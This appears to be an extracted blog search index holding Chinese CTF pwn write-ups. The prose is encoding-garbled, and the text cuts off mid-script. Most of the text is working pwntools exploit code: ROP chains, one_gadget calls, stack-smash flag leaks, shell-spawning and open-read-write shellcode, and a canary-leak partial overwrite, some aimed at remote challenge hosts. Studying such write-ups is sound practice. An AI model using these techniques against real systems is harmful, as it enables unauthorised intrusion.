&lt;img src=&#34;https://oraclepi.tech/post-images/1677919344060.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ê≠£Â∏∏ÊÉÖÂÜµ‰∏ãÂèØ‰ª•getshell&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677919357036.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./yichu2&amp;quot;)
elf=ELF(&amp;quot;./yichu2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
start=elf.sym[b&amp;quot;main&amp;quot;]

vuln=0x401227
pop_rdi_ret=0x4012a3
leave_ret=0x4011e0
bss_addr=0x404080 #0x404080
payload1=cyclic(0x60)+p64(0xdeadbeef)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
# payload1=p64(one_gadget)

io.recvuntil(b&amp;quot;Name:\n&amp;quot;)
io.sendline(payload1)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;ffer:\n&amp;quot;)
payload2=cyclic(0x20)+p64(bss_addr+0x60)+p64(leave_ret)
io.sendline(payload2)


base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;] 
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))
one_gadget=0x4f322+base_addr
print(&amp;quot;one_gadget:  &amp;quot;+hex(one_gadget))
# str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
# print(&amp;quot;str_bin_sh:  &amp;quot;+hex(str_bin_sh))

# sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
# print(&amp;quot;sys_addr:  &amp;quot;+hex(sys_addr))

payload2=cyclic(0x27)+p64(one_gadget)
io.sendline(payload2)

io.interactive()




# Gadgets information
# ============================================================
# 0x00000000004011e0 : leave ; ret
# 0x000000000040129c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040129e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012a0 : pop r14 ; pop r15 ; ret
# 0x00000000004012a2 : pop r15 ; ret
# 0x000000000040129b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040129f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x00000000004012a3 : pop rdi ; ret
# 0x00000000004012a1 : pop rsi ; pop r15 ; ret
# 0x000000000040129d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">yichu2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/64O650yoM/"" data-c="
          &lt;p&gt;Á¨¨‰∫åÈÅì64‰Ωçstack smashÈ¢òÁõÆÔºå‰∏é‰∏ä‰∏ÄÈÅìÊØîËæÉÊ≤°ÊúâÂºÄÂêØpie‰øùÊä§&lt;br&gt;
‰∏ªÂáΩÊï∞Áõ¥Êé•Â∞ÜËØ•È¢òÊú¨‰ΩìÊîæÂá∫Êù•&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677482258983.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËØªÂÖ•flagÂà∞&lt;code&gt;&amp;amp;buf&lt;/code&gt;Â§ÑÔºågets()Ê†àÊ∫¢Âá∫Ë¶ÜÁõñÂà∞&lt;code&gt;__libc_argv[0]&lt;/code&gt;&lt;br&gt;
Ê≠§È¢òoffsetÊú¨Âú∞ÊµãÂá∫Êù•ÂèàÊØîÂπ≥Âè∞Â§ö0x10ÔºåÊòØ‰∏™ÈóÆÈ¢òÔºåÂèØËÉΩÊòØÁéØÂ¢ÉÁöÑÈóÆÈ¢òÔºå‰πüÂèØËÉΩÊòØÂÖ∂ÂÆÉÈóÆÈ¢òÔºåneeded&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677482413009.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊïÖexpÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./smash&amp;quot;)
io=remote(&amp;quot;43.143.7.97&amp;quot;,28537)
flag_addr=0x404060
payload=cyclic(0x1f8)+p64(flag_addr)
io.recvuntil(b&amp;quot;Luck.\n&amp;quot;)
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK3]smash wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/CXTYzf2Lz/"" data-c="
          &lt;p&gt;*Ê≠§È¢òÊú™ÂÆûÈôÖÁî®Âà∞rbpÂØÑÂ≠òÂô®ÔºåÁåúÊµãÊòØrspÂØªÂùÄ&lt;br&gt;
64‰Ωçstack smashÈ¢òÁõÆ,‰øùÊä§ÂÖ®ÂºÄÔºå‰∏ªÂáΩÊï∞‰∏≠Â≠òÂú®gets()ÂèØ‰ª•Ê†àÊ∫¢Âá∫&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479101722.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËÄåÊú¨È¢òÂ≠òÂú®&lt;code&gt;__stack_chk_fail&lt;/code&gt;ÔºåÂπ∂‰∏î&lt;code&gt;sub_CF0&lt;/code&gt;ÂáΩÊï∞ÂèØ‰ª•Â∞ÜflagËØªÂÖ•Âà∞ÂÅèÁßª‰∏∫0x202040Â§ÑÔºåÊÑèÂë≥ÁùÄÂèØ‰ª•Âà©Áî®stack smashÊ≥ÑÈú≤Âá∫flag&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479354508.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂàôÊàë‰ª¨ÂèØ‰ª•ËÄÉËôëÊ≥ÑÈú≤Á®ãÂ∫èÂü∫Âú∞ÂùÄ‰ªéËÄåËé∑Âèñflag_addr,ÂÜçÈÄöËøástack smashÂ∞ÜflagÊâìÂç∞Âá∫Êù•&lt;br&gt;
Ê≠§Êó∂Á¨¨‰∏ÄÊ¨°ËæìÂÖ•ÈôêÂà∂ÈïøÂ∫¶‰∏∫16 bytesÔºåÂèØ‰ª•ËæìÂÖ•Ê≥ÑÈú≤ÂáΩÊï∞ÂÜÖÂ≠òÂú∞ÂùÄÂú®ÂáèÂéªÈ´ò‰ΩçÂÅèÁßªËé∑ÂèñÁ®ãÂ∫èÂü∫ÂùÄ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479564976.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÁÑ∂ÂêéËæìÂÖ•backdoorÂ∞ÜflagËØªÂÖ•&lt;br&gt;
Êé•‰∏ãÊù•ÂÆö‰Ωç&lt;code&gt;__libc_argv[0]&lt;/code&gt;ÊâÄÂú®‰ΩçÁΩÆÔºåÂÆÉ‰Ωú‰∏∫ÊåáÈíàÊåáÂêëÂÜÖÂ≠òÂú∞ÂùÄÂèØ‰ª•‰Ωú‰∏∫Êàë‰ª¨stack smashÂà©Áî®ÁöÑÂÖ≥ÈîÆÔºåÂÜçÈÄöËøáÂèëÁîüÊ∫¢Âá∫ÁöÑ‰ΩçÁΩÆ‰∏éÂÆÉÁöÑÂÅèÁßªÁ°ÆÂÆöÂûÉÂúæÊï∞ÊçÆÈïøÂ∫¶Ôºå‰ΩÜÊòØÊ≠§È¢ògdbÂä®ÊÄÅË∞ÉËØïÊó∂Á°ÆÂÆöÊ∫¢Âá∫ÁÇπÊó∂ÂèëÁé∞&lt;code&gt;$rbp-0x88&lt;/code&gt;Âú∞ÂùÄÂÅè‰∫ÜÂçÅ‰∏áÂÖ´ÂçÉÈáåÔºåÈúÄË¶ÅÈÄöËøá&lt;code&gt;$rsp+0x20&lt;/code&gt;Êù•Ëé∑ÂèñÊ∫¢Âá∫ÁÇπÂú∞ÂùÄÔºåÁåúÊµãÊ≠§È¢òÂèØËÉΩÊòØrspÂØªÂùÄ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677479962101.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰∏çËøáÊ≠§È¢òÊú¨Âú∞Ë∞ÉËØïÊµãÂá∫Êù•offsetÊòØ0x178Ôºå‰∏éËøúÁ´Ø0x168‰∏çÁ¨¶ÔºåÂéüÂõ†ÊöÇÊó∂ËøòÊ≤°ÊêûÊáÇüòø&lt;br&gt;
Âè¶Â§ñÊ≠§È¢òÂè™ÊúâÂÜçÊ¨°ËæìÂÖ•&#39;exitexit&#39;ÊâçËÉΩÁªìÊùüÂæ™ÁéØ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677480094183.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import*
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./easyecho&amp;quot;)
io=remote(&amp;quot;1.14.71.254&amp;quot;,28981)

io.recvuntil(b&amp;quot;: &amp;quot;)
payload=b&amp;quot;a&amp;quot;*15+b&amp;quot;b&amp;quot;
io.sendline(payload)
io.recvuntil(b&amp;quot;b&amp;quot;)

base_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0xcf0
print(&amp;quot;base_addr  &amp;quot;+hex(base_addr))

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;Input: &amp;quot;)
io.sendline(b&amp;quot;backdoor&amp;quot;)

flag_addr=base_addr+0x202040
payload=cyclic(0x168)+p64(flag_addr)
io.recvuntil(b&amp;quot;Input: &amp;quot;)
io.sendline(payload)

io.recvuntil(b&amp;quot;Input: &amp;quot;)
io.sendline(b&amp;quot;exitexit&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[2021 Èπ§ÂüéÊùØ]easyecho wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/-Mc1qDHO8/"" data-c="
          &lt;p&gt;3/4ÔºåÊúâ‰∏ÄÈÅìËøêÊ∞îÂ•ΩÊö¥ÂäõËÑöÊú¨Âá∫Êù•ÁöÑÔºåÊúÄÂêé‰∏ÄÈ¢òrustÈÄÜÂêë...&lt;br&gt;
&lt;strong&gt;myexec&lt;/strong&gt;&lt;br&gt;
mmapÂºÄËæü‰∫Ü‰∏ÄÂùóÂèØÂÜôÂå∫Èó¥ÔºåreadÂáΩÊï∞ÂÜôÂÖ•ËØ•Âå∫Èó¥&lt;br&gt;
Áõ¥Êé•shellcodeÂèëÈÄÅshellcraft.sh()Â∞±Ë°å‰∫Ü&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)

# io=process(&amp;quot;./service&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28003)

shellcode=asm(shellcraft.sh())
io.recvuntil(b&amp;quot;\n&amp;quot;)
io.sendline(shellcode)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;mymem&lt;/strong&gt;&lt;br&gt;
ÂáΩÊï∞‰∏ª‰ΩìÂíå‰∏ä‰∏ÄÈ¢ò‰∏ÄÊ†∑Ôºå‰∏çËøáÊ≠§È¢òseccomp-tools dumpÂá∫Êù•ÂèëÁé∞ÈôêÂà∂‰∫Ü&lt;code&gt;sys_number&lt;/code&gt;&lt;br&gt;
‰∏çËøáÂèØ‰ª•ÊûÑÈÄ†&lt;code&gt;open(&amp;quot;&amp;quot;)+read(&amp;quot;&amp;quot;)+write()&lt;/code&gt;ÁöÑÂáΩÊï∞Ë∞ÉÁî®Êù•ÁªïËøá&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)

# io=process(&amp;quot;./mymem&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28391)
tp_addr=0x50000


shellcode=asm(shellcraft.open(&amp;quot;/home/ctf/flag.txt&amp;quot;))+asm(shellcraft.read(3,tp_addr,50))+asm(shellcraft.write(1,tp_addr,50))
io.recvuntil(b&amp;quot;\n&amp;quot;)
io.sendline(shellcode)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;br&gt;
&lt;strong&gt;oldfashion&lt;/strong&gt;&lt;br&gt;
&lt;s&gt;ÈùûÈ¢ÑÊúü‰∫Ü&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;)


# io=process(&amp;quot;./zzzzz&amp;quot;)
io=remote(&amp;quot;43.142.108.3&amp;quot;,28524)
while 1:
    io.sendline(b&amp;quot;2&amp;quot;)
    if io.recv()==(b&amp;quot;Congratulations! You guessed the number correctly.\n&amp;quot;):
        break

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">NSSCTF Round#9 Basic. ÈÉ®ÂàÜwp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/06adMi_L5/"" data-c="
          &lt;p&gt;ÂèÇËÄÉ&lt;a href=&#34;https://blog.csdn.net/K1ose/article/details/116035405?spm=1001.2101.3001.6650.3&amp;amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-116035405-blog-116607161.pc_relevant_default&amp;amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-3-116035405-blog-116607161.pc_relevant_default&amp;amp;utm_relevant_index=3&#34;&gt;ÂçöÂÆ¢ÈìæÊé•&lt;/a&gt;&lt;br&gt;
Á¨¨‰∏ÄÊ¨°ÂÅöorwÊ≤ôÁõíÁ±ªÈ¢òÁõÆÔºåÊ≠§Á±ªÈ¢òÁõÆ‰∏ÄËà¨ÊòØÁ¶ÅÁî®Á≥ªÁªüË∞ÉÁî®&lt;br&gt;
‰ΩøÁî®&lt;code&gt;$seccomp-tools dump ./orw&lt;/code&gt;Êü•ÁúãË∞ÉÁî®ÔºåÂèëÁé∞ÂºÄÂêØopen,write,readÁ≠âÁ≠âÂáΩÊï∞ÔºåÂèØ‰ª•Âà©Áî®Ëøô‰∫õÂáΩÊï∞ËØªÂèñflagÂπ∂ÊâìÂç∞Âá∫Êù•&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677216184304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËÄå‰∏ªÂáΩÊï∞ÂàôÊèêÁ§∫shellcodeÔºåÂèØ‰ª•Âà©Áî®shellcodeË∞ÉÁî®Ëøô‰∏â‰∏™ÂáΩÊï∞&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677216378453.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰∫éÊòØexpÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

# io=process(&amp;quot;./orw&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29507)

bss_addr=0x804A040
io.recvuntil(b&amp;quot;shellcode:&amp;quot;)

payload=asm(shellcraft.open(&amp;quot;./flag&amp;quot;))+asm(shellcraft.read(3,bss_addr,0x40))+asm(shellcraft.write(1,bss_addr,0x40))   
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÊâìÈÄö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677216548065.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">pwnable_orw wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/zkKMLDz8g/"" data-c="
          &lt;p&gt;32‰Ωç&lt;br&gt;
Á¨¨‰∏ÄÊ¨°ÂêëbssÊÆµÂÜôÂÖ•&lt;code&gt;/bin/sh&lt;/code&gt;ÔºåÁ¨¨‰∫åÊ¨°Ê∫¢Âá∫ÂêéÂà©Áî®32‰Ωç‰º†ÂèÇË∞ÉÁî®&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&lt;br&gt;
Ê≥®ÊÑèÊ≠§Â§ÑË∞ÉÁî®ÁöÑÊòØ‰ª£Á†ÅÊÆµ‰∏≠ÁöÑsystemÂáΩÊï∞Ôºå‰∏çÊòØ&lt;code&gt;call _system&lt;/code&gt;,ÂêéËÄÖ‰º†ÂèÇÁõ¥Êé•‰º†&lt;code&gt;/bin/sh&lt;/code&gt;Ôºå‰∏çÈúÄË¶Åpadding&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./ezr0p&amp;quot;)
io=remote(&amp;quot;43.142.108.3&amp;quot;,28351)
elf=ELF(&amp;quot;./ezr0p&amp;quot;)
# io=remote(&amp;quot;&amp;quot;,)

sys_addr=elf.sym[b&amp;quot;system&amp;quot;]
bss_addr=0x804A080


io.recvuntil(b&amp;quot;name\n&amp;quot;)
payload=b&amp;quot;/bin/sh&amp;quot;
io.send(payload)

io.recvuntil(&amp;quot;time~\n&amp;quot;)
payload=cyclic(0x1c+0x4)+p32(sys_addr)+p32(0)+p32(bss_addr)
io.sendline(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x080484d7 : mov al, byte ptr [0xc9010804] ; ret
# 0x08048381 : mov ebx, 0x81000000 ; ret
# 0x08048440 : mov ebx, dword ptr [esp] ; ret
# 0x0804864b : pop ebp ; ret
# 0x08048648 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x0804839d : pop ebx ; ret
# 0x0804864a : pop edi ; pop ebp ; ret
# 0x08048649 : pop esi ; pop edi ; pop ebp ; ret
# 0x08048386 : ret
# 0x0804848e : ret 0xeac1

# Unique gadgets found: 10
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 Week1]ezr0p32 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/8VhmkjUgk/"" data-c="
          &lt;p&gt;Ê≠§È¢ò‰∏∫64‰Ωçret2shellcodeÊ®°ÊùøÈ¢òÔºåÁ¨¨‰∏ÄÊ¨°Â∞ùËØïshellcodeÁ±ªÂûãÈ¢òÁõÆ&lt;br&gt;
ret2shellcodeÁ±ªÂûãÈ¢òÁõÆ‰∏ÄËà¨ÊòØÂ∞ÜshellcodeÂÜôÂà∞ÂèØÊâßË°åÊÆµÔºåÁÑ∂ÂêéÈÄöËøáretËøîÂõûÂú∞ÂùÄÂà∞ÂÜôÂÖ•ÁöÑÂèØÊâßË°åÊÆµÁöÑÂú∞ÂùÄÊâßË°åshellcodeËé∑Âèñshell&lt;br&gt;
È¶ñÂÖàÊü•Áúã‰øùÊä§ÔºånxÂºÄÂêØÔºåpieÂÖ≥Èó≠Ôºå‰ΩÜÊòØËá™Â∏¶ÁöÑ&lt;code&gt;mprotect&lt;/code&gt;ÂáΩÊï∞ÂèØ‰ª•‰øÆÊîπÁ®ãÂ∫èÂÜÖÂ≠òÊùÉÈôê&lt;br&gt;
ËØ¶ËßÅ&lt;a href=&#34;https://www.yulate.com/82.html&#34;&gt;ÈìæÊé•&lt;/a&gt;,ÂÖàÊåñ‰∏™ÂùëÔºåËøòÊ≤°Â≠¶Âà∞Â†Ü&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676876579446.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ê≠§È¢òidaÂèçÁºñËØëÂêéÂèØËßÅÂ∞ÜËØªÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ÂÜôÂÖ•buffÔºåÂç≥bssÊÆµ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676876749276.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676876755646.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂàôÂèØ‰ª•ËÄÉËôëÂÜôshellcodeÂÜçÂä†‰∏äÂûÉÂúæÂ≠óÁ¨¶Â°´ÂÖÖËææÂà∞Ê∫¢Âá∫ÈïøÂ∫¶Ë¶ÜÁõñrbpÔºåÂÜçÈÄöËøáËøîÂõûbssÂú∞ÂùÄÊâßË°å&lt;br&gt;
expÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./ret2shellcode&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28076)

bss_addr=0x4040a0
shellcode=asm(shellcraft.sh())
payload=shellcode.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(bss_addr)
io.send(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 Week1]ret2shellcode wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/friends/"" data-c="
          &lt;p&gt;glan: &lt;a href=&#34;https://g1an123.github.io/&#34;&gt;https://g1an123.github.io/&lt;/a&gt;&lt;br&gt;
harder: &lt;a href=&#34;https://ha2der.github.io/&#34;&gt;https://ha2der.github.io/&lt;/a&gt;&lt;br&gt;
d3f4u1t: &lt;a href=&#34;https://superfengi.github.io/&#34;&gt;https://superfengi.github.io/&lt;/a&gt;&lt;/p&gt;
">ÂèãÈìæ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/LZZf9NPoM/"" data-c="
          &lt;p&gt;Ê≠§È¢ò64‰ΩçÂºÄÂêØnxÔºåcanaryÔºåpie‰øùÊä§ÔºåÊúâbackdoorÂáΩÊï∞sub_A3E&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676362822117.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Êü•Áúã‰∏ªÂáΩÊï∞ÔºåÂèëÁé∞Ê≤°ÊúâÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºåÊ≥ÑÈú≤canaryÂè™Â•ΩÁî®Âà∞ÂÅèÁßªÔºà0x30-0x8=0x28&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676362855893.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ê≥ÑÈú≤canary&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676362902193.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ê≠§Êó∂‰∏çÂ•ΩÊ≥ÑÈú≤Á®ãÂ∫èÂü∫ÂùÄÔºåÊïÖËÄÉËôëÂáΩÊï∞Áõ¥Êé•ÂÅèÁßªÊù•Ëé∑Âèñ,ÂèØ‰ª•ÁúãÂá∫ËøîÂõûÂú∞ÂùÄ‰Ωé‰Ωç‰∏∫&lt;code&gt;0a&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676363098325.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËÄåÂêéÈó®ÂáΩÊï∞‰Ωé‰Ωç&lt;code&gt;3e&lt;/code&gt;ÔºåÂàôËÄÉËôëË¶ÜÁõñËøîÂõûÂú∞ÂùÄ‰Ωé‰ΩçÊù•Ëé∑ÂèñshellÔºåÂàôÂè™ÈúÄ‰øÆÊîπ1‰∏™Â≠óËäÇÔºåÂèØ‰ª•Áî®&lt;code&gt;p8()&lt;/code&gt;‰øÆÊîπ8bitÁöÑÂÜÖÂÆπ‰πüÂèØ‰ª•Áõ¥Êé•ÂèëÈÄÅ&lt;code&gt;\x3e&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1676363166788.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊïÖexpÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./babypie&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26395)

# gdb.attach(io)
# pause()

io.recvuntil(&amp;quot;Name:\n&amp;quot;)
payload=b&amp;quot;a&amp;quot;*0x28
io.sendline(payload)
io.recvuntil(b&amp;quot;\n&amp;quot;)
# io.recvuntil(b&amp;quot;:\n&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary  &amp;quot;+hex(canary))

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+b&amp;quot;\x3e&amp;quot;
io.sendline(payload)


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âè¶Â§ñËøòÂèØ‰ª•ÁàÜÁ†¥Ëøô8bit&lt;br&gt;
ÁàÜÁ†¥ËÑöÊú¨Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include&amp;lt;bits/stdc++.h&amp;gt;
using namespace std;

char a[16]={&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;};


signed main()
{
    for(int i=0;i&amp;lt;16;i++)
    { 
        for(int j=0;j&amp;lt;16;j++)
        {
            cout&amp;lt;&amp;lt;&amp;quot;b&amp;quot;&amp;lt;&amp;lt;char(34)&amp;lt;&amp;lt;char(92)&amp;lt;&amp;lt;&amp;quot;x&amp;quot;&amp;lt;&amp;lt;a[i]&amp;lt;&amp;lt;a[j]&amp;lt;&amp;lt;char(34)&amp;lt;&amp;lt;&amp;quot;,&amp;quot;;
            // printf(&amp;quot;b&#39;%c%c&#39;,&amp;quot;,a[i],a[j]);
        }
    }


    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1676553162361.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÁàÜÁ†¥expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

